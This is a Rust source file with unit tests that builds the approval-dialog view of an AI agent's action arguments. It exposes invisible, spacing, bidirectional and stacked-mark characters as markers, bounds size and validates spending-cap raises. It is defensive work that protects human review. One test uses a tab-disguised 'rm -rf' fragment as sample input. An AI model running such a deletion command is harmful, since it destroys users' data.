//! What a confirmation shows of its action (APP-115, P4a-R8), Qt-free. The arguments came from the
//! agent, and the owner approves what they read here, so this is stricter than `shown_text`:
//!
//! - **Nothing invisible.** Every Unicode format and default-ignorable character, every control, the
//!   line and paragraph separators, tabs and the blank lookalikes (U+2800, the Hangul fillers) show as
//!   `⟨U+XXXX⟩` ([`marked`]). So do private-use and noncharacter code points, U+FFFC, and combining
//!   marks past a few in a row. The markers count: a value's real size on screen is what is limited.
//!   Lookalike letters stay as they are, by design.
//! - **Right-to-left letters say so.** They can reorder what is around them, and a marker can't show
//!   that, so the row carries `rtl` and the card says it beside the value.
//! - **A value can't draw a boundary.** A real line break starts a new line with a continuation mark
//!   ([`CONTINUATION`]), so a value's extra line can't pass for another argument. Each key is shown in
//!   a place of its own by the card. Any other line-breaking character is a marker.
//! - **Blank lines count.** A run of them is one line saying how many.
//! - **Nothing is cut silently.** A whole action shows in full up to [`SHOWN_BOUND_CHARS`] of what is
//!   shown. Past it, `cut` is true on the rows it reached and `over` on the action: the dialog says so,
//!   and Approve stays off.
//! - **Exact.** It reads the JSON text as the core sent it, before QML's numbers (which lose integers
//!   past 2^53) and QML's key order (which puts integer-like keys first).

use std::hash::{Hash as _, Hasher as _};

use serde::Serialize;
use serde_json::{Map, Value};

/// How much of an action is shown, in characters of what is shown (256 KiB of ASCII).
pub const SHOWN_BOUND_CHARS: usize = 256 * 1024;

/// What starts each extra line of a value.
pub const CONTINUATION: &str = "↳ ";

/// Blank lines in a row from this many on show as one line.
const BLANK_RUN: usize = 2;

/// How many combining marks in a row show as themselves. Pointed Hebrew reaches four.
const COMBINING_RUN: usize = 4;

/// The most arguments shown, each a row to lay out. More is past the bound.
pub const SHOWN_ROWS_MAX: usize = 1000;

/// Whether `c` shows as a marker: a reader couldn't see it, or it would move the text around.
pub fn is_marked(c: char) -> bool {
    c.is_control()
        || lil_parse::is_invisible(c)
        // Noncharacters: the last two of every plane, and these.
        || u32::from(c) & 0xfffe == 0xfffe
        || matches!(
            c,
            '\u{fdd0}'..='\u{fdef}'
            // Private use: what it draws depends on the font.
            | '\u{e000}'..='\u{f8ff}' | '\u{f0000}'..='\u{ffffd}' | '\u{100000}'..='\u{10fffd}'
            // The object replacement character, and a blank that takes up room.
            | '\u{fffc}' | '\u{16fe4}'
        )
        || matches!(
            c,
            // The bidirectional controls, which is_invisible leaves to shown_text.
            '\u{200e}' | '\u{200f}' | '\u{202a}'..='\u{202e}' | '\u{2066}'..='\u{2069}'
            // Line and paragraph separators (Zl, Zp).
            | '\u{2028}' | '\u{2029}'
            // The rest of the format characters (Cf) that aren't default-ignorable.
            | '\u{600}'..='\u{605}' | '\u{6dd}' | '\u{70f}' | '\u{890}'..='\u{891}' | '\u{8e2}'
            | '\u{fff9}'..='\u{fffb}' | '\u{110bd}' | '\u{110cd}' | '\u{13430}'..='\u{1343f}'
            // A blank that isn't a space, like the Hangul fillers (default-ignorable, above).
            | '\u{2800}'
            // Spaces that aren't the plain one: a path can differ by one and read the same.
            | '\u{a0}' | '\u{1680}' | '\u{2000}'..='\u{200a}' | '\u{202f}' | '\u{205f}' | '\u{3000}'
        )
}

/// `s` on one line, with everything [`is_marked`] says as `⟨U+XXXX⟩`, and any combining marks past
/// [`COMBINING_RUN`] in a row.
pub fn marked(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut run = 0;
    for c in s.chars() {
        run = if is_combining(c) { run + 1 } else { 0 };
        if is_marked(c) || run > COMBINING_RUN {
            out.push_str(&format!("\u{27e8}U+{:04X}\u{27e9}", u32::from(c)));
        } else {
            out.push(c);
        }
    }
    out
}

/// The marks that stack over and under a letter, so that a long run draws over other lines. Real
/// writing keeps to a few.
fn is_combining(c: char) -> bool {
    let c = u32::from(c);
    STACKING_MARKS
        .binary_search_by(|&(first, last)| {
            if c < first {
                std::cmp::Ordering::Greater
            } else if c > last {
                std::cmp::Ordering::Less
            } else {
                std::cmp::Ordering::Equal
            }
        })
        .is_ok()
}

/// Unicode's general categories Mn and Me as ranges, in order, from `icu_properties` 2.3 once. Not a
/// dependency: nothing else `lil_qt` links uses it. Spacing marks (Mc) take their own room.
#[rustfmt::skip]
const STACKING_MARKS: &[(u32, u32)] = &[
    (0x300, 0x36f), (0x483, 0x489), (0x591, 0x5bd), (0x5bf, 0x5bf),
    (0x5c1, 0x5c2), (0x5c4, 0x5c5), (0x5c7, 0x5c7), (0x610, 0x61a),
    (0x64b, 0x65f), (0x670, 0x670), (0x6d6, 0x6dc), (0x6df, 0x6e4),
    (0x6e7, 0x6e8), (0x6ea, 0x6ed), (0x711, 0x711), (0x730, 0x74a),
    (0x7a6, 0x7b0), (0x7eb, 0x7f3), (0x7fd, 0x7fd), (0x816, 0x819),
    (0x81b, 0x823), (0x825, 0x827), (0x829, 0x82d), (0x859, 0x85b),
    (0x897, 0x89f), (0x8ca, 0x8e1), (0x8e3, 0x902), (0x93a, 0x93a),
    (0x93c, 0x93c), (0x941, 0x948), (0x94d, 0x94d), (0x951, 0x957),
    (0x962, 0x963), (0x981, 0x981), (0x9bc, 0x9bc), (0x9c1, 0x9c4),
    (0x9cd, 0x9cd), (0x9e2, 0x9e3), (0x9fe, 0x9fe), (0xa01, 0xa02),
    (0xa3c, 0xa3c), (0xa41, 0xa42), (0xa47, 0xa48), (0xa4b, 0xa4d),
    (0xa51, 0xa51), (0xa70, 0xa71), (0xa75, 0xa75), (0xa81, 0xa82),
    (0xabc, 0xabc), (0xac1, 0xac5), (0xac7, 0xac8), (0xacd, 0xacd),
    (0xae2, 0xae3), (0xafa, 0xaff), (0xb01, 0xb01), (0xb3c, 0xb3c),
    (0xb3f, 0xb3f), (0xb41, 0xb44), (0xb4d, 0xb4d), (0xb55, 0xb56),
    (0xb62, 0xb63), (0xb82, 0xb82), (0xbc0, 0xbc0), (0xbcd, 0xbcd),
    (0xc00, 0xc00), (0xc04, 0xc04), (0xc3c, 0xc3c), (0xc3e, 0xc40),
    (0xc46, 0xc48), (0xc4a, 0xc4d), (0xc55, 0xc56), (0xc62, 0xc63),
    (0xc81, 0xc81), (0xcbc, 0xcbc), (0xcbf, 0xcbf), (0xcc6, 0xcc6),
    (0xccc, 0xccd), (0xce2, 0xce3), (0xd00, 0xd01), (0xd3b, 0xd3c),
    (0xd41, 0xd44), (0xd4d, 0xd4d), (0xd62, 0xd63), (0xd81, 0xd81),
    (0xdca, 0xdca), (0xdd2, 0xdd4), (0xdd6, 0xdd6), (0xe31, 0xe31),
    (0xe34, 0xe3a), (0xe47, 0xe4e), (0xeb1, 0xeb1), (0xeb4, 0xebc),
    (0xec8, 0xece), (0xf18, 0xf19), (0xf35, 0xf35), (0xf37, 0xf37),
    (0xf39, 0xf39), (0xf71, 0xf7e), (0xf80, 0xf84), (0xf86, 0xf87),
    (0xf8d, 0xf97), (0xf99, 0xfbc), (0xfc6, 0xfc6), (0x102d, 0x1030),
    (0x1032, 0x1037), (0x1039, 0x103a), (0x103d, 0x103e), (0x1058, 0x1059),
    (0x105e, 0x1060), (0x1071, 0x1074), (0x1082, 0x1082), (0x1085, 0x1086),
    (0x108d, 0x108d), (0x109d, 0x109d), (0x135d, 0x135f), (0x1712, 0x1714),
    (0x1732, 0x1733), (0x1752, 0x1753), (0x1772, 0x1773), (0x17b4, 0x17b5),
    (0x17b7, 0x17bd), (0x17c6, 0x17c6), (0x17c9, 0x17d3), (0x17dd, 0x17dd),
    (0x180b, 0x180d), (0x180f, 0x180f), (0x1885, 0x1886), (0x18a9, 0x18a9),
    (0x1920, 0x1922), (0x1927, 0x1928), (0x1932, 0x1932), (0x1939, 0x193b),
    (0x1a17, 0x1a18), (0x1a1b, 0x1a1b), (0x1a56, 0x1a56), (0x1a58, 0x1a5e),
    (0x1a60, 0x1a60), (0x1a62, 0x1a62), (0x1a65, 0x1a6c), (0x1a73, 0x1a7c),
    (0x1a7f, 0x1a7f), (0x1ab0, 0x1add), (0x1ae0, 0x1aeb), (0x1b00, 0x1b03),
    (0x1b34, 0x1b34), (0x1b36, 0x1b3a), (0x1b3c, 0x1b3c), (0x1b42, 0x1b42),
    (0x1b6b, 0x1b73), (0x1b80, 0x1b81), (0x1ba2, 0x1ba5), (0x1ba8, 0x1ba9),
    (0x1bab, 0x1bad), (0x1be6, 0x1be6), (0x1be8, 0x1be9), (0x1bed, 0x1bed),
    (0x1bef, 0x1bf1), (0x1c2c, 0x1c33), (0x1c36, 0x1c37), (0x1cd0, 0x1cd2),
    (0x1cd4, 0x1ce0), (0x1ce2, 0x1ce8), (0x1ced, 0x1ced), (0x1cf4, 0x1cf4),
    (0x1cf8, 0x1cf9), (0x1dc0, 0x1dff), (0x20d0, 0x20f0), (0x2cef, 0x2cf1),
    (0x2d7f, 0x2d7f), (0x2de0, 0x2dff), (0x302a, 0x302d), (0x3099, 0x309a),
    (0xa66f, 0xa672), (0xa674, 0xa67d), (0xa69e, 0xa69f), (0xa6f0, 0xa6f1),
    (0xa802, 0xa802), (0xa806, 0xa806), (0xa80b, 0xa80b), (0xa825, 0xa826),
    (0xa82c, 0xa82c), (0xa8c4, 0xa8c5), (0xa8e0, 0xa8f1), (0xa8ff, 0xa8ff),
    (0xa926, 0xa92d), (0xa947, 0xa951), (0xa980, 0xa982), (0xa9b3, 0xa9b3),
    (0xa9b6, 0xa9b9), (0xa9bc, 0xa9bd), (0xa9e5, 0xa9e5), (0xaa29, 0xaa2e),
    (0xaa31, 0xaa32), (0xaa35, 0xaa36), (0xaa43, 0xaa43), (0xaa4c, 0xaa4c),
    (0xaa7c, 0xaa7c), (0xaab0, 0xaab0), (0xaab2, 0xaab4), (0xaab7, 0xaab8),
    (0xaabe, 0xaabf), (0xaac1, 0xaac1), (0xaaec, 0xaaed), (0xaaf6, 0xaaf6),
    (0xabe5, 0xabe5), (0xabe8, 0xabe8), (0xabed, 0xabed), (0xfb1e, 0xfb1e),
    (0xfe00, 0xfe0f), (0xfe20, 0xfe2f), (0x101fd, 0x101fd), (0x102e0, 0x102e0),
    (0x10376, 0x1037a), (0x10a01, 0x10a03), (0x10a05, 0x10a06), (0x10a0c, 0x10a0f),
    (0x10a38, 0x10a3a), (0x10a3f, 0x10a3f), (0x10ae5, 0x10ae6), (0x10d24, 0x10d27),
    (0x10d69, 0x10d6d), (0x10eab, 0x10eac), (0x10efa, 0x10eff), (0x10f46, 0x10f50),
    (0x10f82, 0x10f85), (0x11001, 0x11001), (0x11038, 0x11046), (0x11070, 0x11070),
    (0x11073, 0x11074), (0x1107f, 0x11081), (0x110b3, 0x110b6), (0x110b9, 0x110ba),
    (0x110c2, 0x110c2), (0x11100, 0x11102), (0x11127, 0x1112b), (0x1112d, 0x11134),
    (0x11173, 0x11173), (0x11180, 0x11181), (0x111b6, 0x111be), (0x111c9, 0x111cc),
    (0x111cf, 0x111cf), (0x1122f, 0x11231), (0x11234, 0x11234), (0x11236, 0x11237),
    (0x1123e, 0x1123e), (0x11241, 0x11241), (0x112df, 0x112df), (0x112e3, 0x112ea),
    (0x11300, 0x11301), (0x1133b, 0x1133c), (0x11340, 0x11340), (0x11366, 0x1136c),
    (0x11370, 0x11374), (0x113bb, 0x113c0), (0x113ce, 0x113ce), (0x113d0, 0x113d0),
    (0x113d2, 0x113d2), (0x113e1, 0x113e2), (0x11438, 0x1143f), (0x11442, 0x11444),
    (0x11446, 0x11446), (0x1145e, 0x1145e), (0x114b3, 0x114b8), (0x114ba, 0x114ba),
    (0x114bf, 0x114c0), (0x114c2, 0x114c3), (0x115b2, 0x115b5), (0x115bc, 0x115bd),
    (0x115bf, 0x115c0), (0x115dc, 0x115dd), (0x11633, 0x1163a), (0x1163d, 0x1163d),
    (0x1163f, 0x11640), (0x116ab, 0x116ab), (0x116ad, 0x116ad), (0x116b0, 0x116b5),
    (0x116b7, 0x116b7), (0x1171d, 0x1171d), (0x1171f, 0x1171f), (0x11722, 0x11725),
    (0x11727, 0x1172b), (0x1182f, 0x11837), (0x11839, 0x1183a), (0x1193b, 0x1193c),
    (0x1193e, 0x1193e), (0x11943, 0x11943), (0x119d4, 0x119d7), (0x119da, 0x119db),
    (0x119e0, 0x119e0), (0x11a01, 0x11a0a), (0x11a33, 0x11a38), (0x11a3b, 0x11a3e),
    (0x11a47, 0x11a47), (0x11a51, 0x11a56), (0x11a59, 0x11a5b), (0x11a8a, 0x11a96),
    (0x11a98, 0x11a99), (0x11b60, 0x11b60), (0x11b62, 0x11b64), (0x11b66, 0x11b66),
    (0x11c30, 0x11c36), (0x11c38, 0x11c3d), (0x11c3f, 0x11c3f), (0x11c92, 0x11ca7),
    (0x11caa, 0x11cb0), (0x11cb2, 0x11cb3), (0x11cb5, 0x11cb6), (0x11d31, 0x11d36),
    (0x11d3a, 0x11d3a), (0x11d3c, 0x11d3d), (0x11d3f, 0x11d45), (0x11d47, 0x11d47),
    (0x11d90, 0x11d91), (0x11d95, 0x11d95), (0x11d97, 0x11d97), (0x11ef3, 0x11ef4),
    (0x11f00, 0x11f01), (0x11f36, 0x11f3a), (0x11f40, 0x11f40), (0x11f42, 0x11f42),
    (0x11f5a, 0x11f5a), (0x13440, 0x13440), (0x13447, 0x13455), (0x1611e, 0x16129),
    (0x1612d, 0x1612f), (0x16af0, 0x16af4), (0x16b30, 0x16b36), (0x16f4f, 0x16f4f),
    (0x16f8f, 0x16f92), (0x16fe4, 0x16fe4), (0x1bc9d, 0x1bc9e), (0x1cf00, 0x1cf2d),
    (0x1cf30, 0x1cf46), (0x1d167, 0x1d169), (0x1d17b, 0x1d182), (0x1d185, 0x1d18b),
    (0x1d1aa, 0x1d1ad), (0x1d242, 0x1d244), (0x1da00, 0x1da36), (0x1da3b, 0x1da6c),
    (0x1da75, 0x1da75), (0x1da84, 0x1da84), (0x1da9b, 0x1da9f), (0x1daa1, 0x1daaf),
    (0x1e000, 0x1e006), (0x1e008, 0x1e018), (0x1e01b, 0x1e021), (0x1e023, 0x1e024),
    (0x1e026, 0x1e02a), (0x1e08f, 0x1e08f), (0x1e130, 0x1e136), (0x1e2ae, 0x1e2ae),
    (0x1e2ec, 0x1e2ef), (0x1e4ec, 0x1e4ef), (0x1e5ee, 0x1e5ef), (0x1e6e3, 0x1e6e3),
    (0x1e6e6, 0x1e6e6), (0x1e6ee, 0x1e6ef), (0x1e6f5, 0x1e6f5), (0x1e8d0, 0x1e8d6),
    (0x1e944, 0x1e94a), (0xe0100, 0xe01ef),
];

/// Whether what is shown holds a right-to-left letter. By the bidirectional rules such a letter can
/// reorder the numbers and words around it, and no marker can show that: the card says so instead.
fn has_right_to_left(shown: &str) -> bool {
    shown.chars().any(|c| {
        matches!(
            c,
            '\u{590}'..='\u{8ff}' | '\u{fb1d}'..='\u{fdff}' | '\u{fe70}'..='\u{fefe}'
            | '\u{10800}'..='\u{10fff}' | '\u{1e800}'..='\u{1efff}'
        )
    })
}

/// A short name from outside (a tool, a caller, a project): [`marked`], then `shown_text`'s limit.
pub fn shown_line(s: &str, max_chars: usize) -> String {
    lil_parse::shown_text(&marked(s), max_chars)
}

/// One argument as shown.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct ShownArgument {
    /// Empty when the arguments aren't an object.
    pub key: String,
    pub text: String,
    /// Part of it isn't shown.
    pub cut: bool,
    /// It holds right-to-left letters, so it can draw in another order than it reads.
    pub rtl: bool,
}

/// A whole action as shown.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct ShownAction {
    pub rows: Vec<ShownArgument>,
    /// It is past [`SHOWN_BOUND_CHARS`], or couldn't be read: Approve stays off.
    pub over: bool,
    /// Changes with what is shown: a dialog re-arms when this does.
    pub digest: String,
}

/// Adds to `out` until `left` runs out; whether all of `text` went in.
fn take(out: &mut String, left: &mut usize, text: &str) -> bool {
    for c in text.chars() {
        if *left == 0 {
            return false;
        }
        out.push(c);
        *left -= 1;
    }
    true
}

fn value_text(value: &Value) -> String {
    match value {
        Value::String(s) => s.clone(),
        // Not through anything that rounds: this is the core's own number, pretty-printed.
        other => serde_json::to_string_pretty(other).unwrap_or_else(|_| other.to_string()),
    }
}

fn is_blank(line: &str) -> bool {
    line.chars().all(|c| c.is_whitespace() && !is_marked(c))
}

/// A value as it is shown, within `left` characters, which it uses up; and whether all of it went in.
fn shown_value(raw: &str, left: &mut usize) -> (String, bool) {
    let mut out = String::new();
    let mut first = true;
    let mut lines = split_lines(raw).peekable();
    while let Some(line) = lines.next() {
        let mut piece = String::new();
        if !first {
            piece.push('\n');
            piece.push_str(CONTINUATION);
        }
        if is_blank(line) {
            let mut run = 1;
            while lines.peek().is_some_and(|next| is_blank(next)) {
                lines.next();
                run += 1;
            }
            if run >= BLANK_RUN {
                piece.push_str(&format!("\u{27e8}{run} empty lines\u{27e9}"));
            } else {
                piece.push_str(line);
            }
        } else {
            piece.push_str(&marked(line));
        }
        if !take(&mut out, left, &piece) {
            return (out, false);
        }
        first = false;
    }
    (out, true)
}

/// Splits at real line breaks only (`\r\n`, `\n`, `\r`). Other separators stay, to show as markers.
fn split_lines(raw: &str) -> impl Iterator<Item = &str> {
    let mut rest = Some(raw);
    std::iter::from_fn(move || {
        let text = rest?;
        match text.find(['\r', '\n']) {
            None => {
                rest = None;
                Some(text)
            }
            Some(at) => {
                let skip = if text[at..].starts_with("\r\n") { 2 } else { 1 };
                rest = Some(&text[at + skip..]);
                Some(&text[..at])
            }
        }
    })
}

/// The whole action, up to `bound` characters of what is shown.
pub fn shown_action_within(arguments: &Value, bound: usize) -> ShownAction {
    let mut left = bound;
    let mut over = false;
    let mut rows = Vec::new();
    let mut one = |key: String, value: &Value, left: &mut usize| {
        let mut shown_key = String::new();
        let key_whole = take(&mut shown_key, left, &key);
        let (text, whole) = shown_value(&value_text(value), left);
        let whole = whole && key_whole;
        over |= !whole;
        rows.push(ShownArgument {
            rtl: has_right_to_left(&shown_key) || has_right_to_left(&text),
            key: shown_key,
            text,
            cut: !whole,
        });
    };
    match arguments {
        Value::Null => {}
        Value::Object(map) => {
            for (key, value) in map.iter().take(SHOWN_ROWS_MAX) {
                one(marked(key), value, &mut left);
            }
        }
        other => one(String::new(), other, &mut left),
    }
    let too_many_rows = arguments
        .as_object()
        .is_some_and(|map| map.len() > SHOWN_ROWS_MAX);
    if too_many_rows && let Some(last) = rows.last_mut() {
        last.cut = true;
    }
    let over = over || too_many_rows;
    let mut hasher = std::collections::hash_map::DefaultHasher::new();
    for row in &rows {
        row.key.hash(&mut hasher);
        row.text.hash(&mut hasher);
    }
    ShownAction {
        rows,
        over,
        digest: format!("{:016x}", hasher.finish()),
    }
}

/// The whole action, up to [`SHOWN_BOUND_CHARS`].
pub fn shown_action(arguments: &Value) -> ShownAction {
    shown_action_within(arguments, SHOWN_BOUND_CHARS)
}

/// Why a typed amount can't be the new limit of a cap now at `limit` (the core's decimal string), by
/// name, or `None` when it can. The Raise button shows the amount through `money_text`, which rounds
/// to the currency's minor unit, and what is sent must be what it says, so more decimals are refused.
/// A raise that isn't higher is refused too, and so is one above the largest amount the core holds
/// (`i64` micro-units). Text, never a float.
pub fn raise_refusal(amount: &str, limit: &str, currency: &str) -> Option<&'static str> {
    let Some(new) = Decimal::parse(amount) else {
        return Some("not_a_number");
    };
    if new.fraction.len() > crate::money::minor_unit(currency) {
        return Some("too_many_decimals");
    }
    let largest = Decimal {
        whole: "9223372036854",
        fraction: "775807",
    };
    if new.compare(&largest) == std::cmp::Ordering::Greater {
        return Some("too_large");
    }
    // A limit that can't be read refuses nothing here: the core has the say.
    Decimal::parse(limit)
        .is_some_and(|now| new.compare(&now) != std::cmp::Ordering::Greater)
        .then_some("not_higher")
}

/// A non-negative decimal's digits, with no leading or trailing zeros to compare.
struct Decimal<'a> {
    whole: &'a str,
    fraction: &'a str,
}

impl<'a> Decimal<'a> {
    /// Digits, at most 18 before the point, and any after it.
    fn parse(text: &'a str) -> Option<Decimal<'a>> {
        let (whole, fraction) = text.split_once('.').unwrap_or((text, ""));
        let digits = |s: &str| s.bytes().all(|b| b.is_ascii_digit());
        let dangling_point = text.contains('.') && fraction.is_empty();
        if whole.is_empty()
            || whole.len() > 18
            || !digits(whole)
            || !digits(fraction)
            || dangling_point
        {
            return None;
        }
        Some(Decimal {
            whole: whole.trim_start_matches('0'),
            fraction: fraction.trim_end_matches('0'),
        })
    }

    fn compare(&self, other: &Decimal<'_>) -> std::cmp::Ordering {
        self.whole
            .len()
            .cmp(&other.whole.len())
            .then_with(|| self.whole.cmp(other.whole))
            .then_with(|| self.fraction.cmp(other.fraction))
    }
}

/// From the JSON text of a `confirmations` event, an `app/confirmations.list` result or an
/// `app/confirmation.answer` result: `{<id>: ShownAction}`, as JSON. Text that isn't JSON gives `{}`:
/// the dialog then has nothing to show, and Approve stays off.
pub fn shown_actions_json(json: &str) -> String {
    let Ok(value) = serde_json::from_str::<Value>(json) else {
        return "{}".to_string();
    };
    let mut out = Map::new();
    let mut add = |row: &Value| {
        if let (Some(id), Some(arguments)) = (row["id"].as_str(), row.get("arguments"))
            && let Ok(shown) = serde_json::to_value(shown_action(arguments))
        {
            out.insert(id.to_string(), shown);
        }
    };
    if let Some(rows) = value["confirmations"].as_array() {
        rows.iter().for_each(&mut add);
    }
    if value.get("confirmation").is_some() {
        add(&value["confirmation"]);
    }
    Value::Object(out).to_string()
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn one(value: Value) -> ShownArgument {
        shown_action(&json!({ "a": value })).rows.remove(0)
    }

    /// `א 100 ב 900 ג` keeps its text, and by the bidi rules draws with the numbers swapped.
    #[test] // spec: APP-115, P4a-R8
    fn right_to_left_letters_say_so_beside_the_value() {
        for rtl in [
            "א 100 ב 900 ג",
            "pay 100 to \u{5d0}",
            "\u{627}\u{644}\u{639}\u{631}\u{628}\u{64a}\u{629}",
            "\u{fb50}",
            "\u{10800}",
            "\u{1e900}",
        ] {
            let row = one(json!(rtl));
            assert!(row.rtl, "{rtl}");
            assert_eq!(row.text, rtl, "the text stays as it is");
        }
        for not in [
            "C:\\art\\crane.png",
            "caf\u{e9} 100",
            "\u{442}\u{435}\u{441}\u{442}",
            "\u{65e5}\u{672c}\u{8a9e}",
            // Only a marker of it is left.
            "\u{200f}",
        ] {
            assert!(!one(json!(not)).rtl, "{not}");
        }
        let keyed = shown_action(&json!({"\u{5d0}": "x"}));
        assert!(keyed.rows[0].rtl, "a key too");
    }

    #[test] // spec: APP-115, P4a-R8
    fn what_a_reader_cant_tell_shows_as_a_marker() {
        for (c, name) in [
            ('\u{fffc}', "U+FFFC"),
            ('\u{16fe4}', "U+16FE4"),
            ('\u{e000}', "U+E000"),
            ('\u{f8ff}', "U+F8FF"),
            ('\u{f0000}', "U+F0000"),
            ('\u{10fffd}', "U+10FFFD"),
            ('\u{fdd0}', "U+FDD0"),
            ('\u{fdef}', "U+FDEF"),
            ('\u{fffe}', "U+FFFE"),
            ('\u{ffff}', "U+FFFF"),
            ('\u{1fffe}', "U+1FFFE"),
            ('\u{10ffff}', "U+10FFFF"),
        ] {
            assert_eq!(
                marked(&format!("a{c}b")),
                format!("a\u{27e8}{name}\u{27e9}b")
            );
        }
        // Lookalikes stay, by design, and so does what only looks odd.
        for plain in ["\u{430}pple", "\u{fffd}", "\u{e9}", "e\u{301}"] {
            assert_eq!(marked(plain), plain);
        }
    }

    #[test] // spec: APP-115, P4a-R8
    fn a_long_stack_of_combining_marks_shows_as_markers() {
        // Real writing stacks a few: Vietnamese two, pointed Hebrew up to four.
        assert_eq!(marked("e\u{302}\u{301}"), "e\u{302}\u{301}");
        let four = "\u{5d0}\u{5b0}\u{5bc}\u{591}\u{592}";
        assert_eq!(marked(four), four);
        // Past that, what is drawn over the line above and below is a marker.
        assert_eq!(
            marked("a\u{336}\u{337}\u{338}\u{339}\u{33a}\u{33b}b"),
            "a\u{336}\u{337}\u{338}\u{339}\u{27e8}U+033A\u{27e9}\u{27e8}U+033B\u{27e9}b"
        );
        // Thai marks, and the run starts again after a letter.
        assert_eq!(
            marked("\u{e01}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}"),
            "\u{e01}\u{e49}\u{e49}\u{e49}\u{e49}\u{27e8}U+0E49\u{27e9}"
        );
        let two = "a\u{301}\u{301}\u{301}b\u{301}\u{301}\u{301}";
        assert_eq!(marked(two), two);
    }

    /// Every script's marks, not only the common ones: Tibetan's stack tallest.
    #[test] // spec: APP-115, P4a-R8
    fn every_scripts_marks_stack_to_markers() {
        for c in [
            '\u{0fb2}',
            '\u{0f71}',
            '\u{093c}',
            '\u{094d}',
            '\u{0eb4}',
            '\u{0ec8}',
            '\u{1cd0}',
            '\u{302a}',
            '\u{3099}',
            '\u{1b6b}',
            '\u{0711}',
            '\u{0730}',
            '\u{07eb}',
            '\u{0816}',
            '\u{08d4}',
            '\u{a8e0}',
            '\u{10eab}',
            '\u{16af0}',
            '\u{1e8d0}',
            '\u{1e944}',
        ] {
            let stack: String = std::iter::once('a').chain([c; 12]).collect();
            let shown = marked(&stack);
            assert_eq!(
                shown.matches('\u{27e8}').count(),
                8,
                "U+{:04X}: {shown}",
                u32::from(c)
            );
        }
        // A letter isn't a mark, however many come in a row.
        let letters = "\u{0915}\u{0916}\u{0917}\u{0918}\u{0919}\u{091a}\u{0f40}\u{0e01}\u{0e02}";
        assert_eq!(marked(letters), letters);
    }

    /// Each character class the security review named.
    #[test] // spec: P4a-R8, APP-115
    fn every_invisible_character_shows_as_a_marker() {
        for (c, class) in [
            ('\u{e0041}', "tag"),
            ('\u{e0001}', "language tag"),
            ('\u{2062}', "invisible times"),
            ('\u{ad}', "soft hyphen"),
            ('\u{3164}', "Hangul filler"),
            ('\u{115f}', "Hangul choseong filler"),
            ('\u{ffa0}', "halfwidth Hangul filler"),
            ('\u{61c}', "Arabic letter mark"),
            ('\u{34f}', "combining grapheme joiner"),
            ('\u{fe00}', "variation selector"),
            ('\u{2028}', "line separator"),
            ('\u{2029}', "paragraph separator"),
            ('\u{fff9}', "interlinear annotation"),
            ('\u{180e}', "Mongolian vowel separator"),
            ('\u{206a}', "deprecated format"),
            ('\u{1d173}', "musical format"),
            ('\u{2800}', "Braille blank"),
            ('\u{202e}', "bidi override"),
            ('\u{200b}', "zero width space"),
            ('\u{200d}', "zero width joiner"),
            ('\u{feff}', "byte order mark"),
            ('\u{600}', "Arabic number sign"),
            ('\u{13430}', "Egyptian format"),
            ('\t', "tab"),
            ('\u{b}', "vertical tab"),
            ('\u{c}', "form feed"),
            ('\u{85}', "next line"),
            ('\u{7}', "bell"),
            ('\u{1}', "control"),
            ('\u{7f}', "delete"),
        ] {
            let text = format!("x{c}y");
            let want = format!("x\u{27e8}U+{:04X}\u{27e9}y", u32::from(c));
            assert_eq!(marked(&text), want, "{class}");
            assert_eq!(one(json!(text)).text, want, "{class}");
            assert_eq!(shown_line(&text, 100), want, "{class}");
        }
        assert_eq!(marked("rm\t-rf"), "rm⟨U+0009⟩-rf");
        // What a reader can see stays as it is.
        for text in ["plain", "café", "日本語", "C:\\art\\a b.png"] {
            assert_eq!(marked(text), text);
        }
    }

    #[test] // spec: P4a-R8, APP-115
    fn spaces_that_arent_the_plain_one_show_as_markers() {
        for c in [
            '\u{a0}', '\u{1680}', '\u{2003}', '\u{2009}', '\u{202f}', '\u{205f}', '\u{3000}',
        ] {
            let want = format!("a\u{27e8}U+{:04X}\u{27e9}b", u32::from(c));
            assert_eq!(marked(&format!("a{c}b")), want);
        }
        assert_eq!(marked("a b"), "a b", "the plain space stays");
    }

    #[test] // spec: APP-115
    fn the_bound_counts_keys_and_rows() {
        let shown = shown_action(&json!({ "k".repeat(SHOWN_BOUND_CHARS + 1): "" }));
        assert!(shown.over && shown.rows[0].cut, "a huge key is past it");
        assert_eq!(shown.rows[0].key.chars().count(), SHOWN_BOUND_CHARS);
        let mut many = Map::new();
        for i in 0..=SHOWN_ROWS_MAX {
            many.insert(format!("k{i}"), Value::Null);
        }
        let shown = shown_action(&Value::Object(many));
        assert!(shown.over, "more rows than it shows");
        assert_eq!(shown.rows.len(), SHOWN_ROWS_MAX);
        assert!(shown.rows.last().unwrap().cut, "and the last one says so");
        let mut enough = Map::new();
        for i in 0..SHOWN_ROWS_MAX {
            enough.insert(format!("k{i}"), Value::Null);
        }
        assert!(!shown_action(&Value::Object(enough)).over);
    }

    #[test] // spec: APP-054
    fn a_raise_is_a_number_in_the_currencys_decimals_and_higher() {
        for (amount, limit, currency, want) in [
            ("12", "1", "USD", None),
            ("12.50", "1", "USD", None),
            ("12.500", "1", "USD", None),
            ("1.01", "1", "USD", None),
            ("25000000", "20", "USD", None),
            ("121", "120", "JPY", None),
            ("2", "not a number", "USD", None),
            ("lots", "1", "USD", Some("not_a_number")),
            ("", "1", "USD", Some("not_a_number")),
            ("1.", "1", "USD", Some("not_a_number")),
            (".5", "0", "USD", Some("not_a_number")),
            ("-5", "1", "USD", Some("not_a_number")),
            ("1e3", "1", "USD", Some("not_a_number")),
            ("1234567890123456789", "1", "USD", Some("not_a_number")),
            ("25.999", "1", "USD", Some("too_many_decimals")),
            ("0.001", "0", "USD", Some("too_many_decimals")),
            ("120.7", "1", "JPY", Some("too_many_decimals")),
            ("1", "1", "USD", Some("not_higher")),
            ("1.00", "1", "USD", Some("not_higher")),
            ("0.5", "1", "USD", Some("not_higher")),
            ("50", "100", "USD", Some("not_higher")),
            ("9", "10", "USD", Some("not_higher")),
            ("1.09", "1.1", "USD", Some("not_higher")),
        ] {
            assert_eq!(
                raise_refusal(amount, limit, currency),
                want,
                "{amount} over {limit}"
            );
        }
    }

    // The core holds a limit as i64 micro-units, at most 9,223,372,036,854.775807: one step of the
    // currency more is refused here, in words of its own, not sent for the core to call it no number.
    #[test] // spec: APP-054
